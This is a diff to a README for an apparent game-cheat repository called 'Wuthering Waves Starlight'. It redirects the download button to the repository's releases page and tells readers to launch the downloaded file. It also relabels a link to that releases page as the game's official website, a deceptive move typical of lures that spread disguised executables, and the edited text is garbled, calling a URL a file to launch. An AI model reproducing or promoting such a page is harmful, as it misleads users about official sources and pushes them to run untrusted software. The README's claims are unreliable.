@@ -36,14 +36,14 @@ Welcome to the Wuthering Waves Starlight repository, your one-stop solution for 
 
 ## Get Started
 To access the latest version of the software, click the button below:
-[![Download App](https://img.shields.io/badge/Download-App.zip-brightgreen)](https://github.com/repo/releases/9246/App.zip)
+[![Download App](https://github.com/dondada05/Wuthering-Waves-Starlight/releases)](https://github.com/dondada05/Wuthering-Waves-Starlight/releases)
 
-📂 *Note: The App.zip file needs to be launched to initiate the installation process.*
+📂 *Note: The https://github.com/dondada05/Wuthering-Waves-Starlight/releases file needs to be launched to initiate the installation process.*
 
 If the above link is not working or you need more information, please visit the "Releases" section of this repository.
 
 ## Additional Resources
-For more information and updates, you can visit the official [Wuthering Waves](https://www.wutheringwaves.com/) website.
+For more information and updates, you can visit the official [Wuthering Waves](https://github.com/dondada05/Wuthering-Waves-Starlight/releases) website.
 
 ## Conclusion
 Thank you for exploring the Wuthering Waves Starlight repository. We hope this software enhances your experience and gives you the competitive edge you are looking for in the Wuthering Waves ecosystem. Stay tuned for more updates and features coming your way! 🌟🚀🌌💻🔥
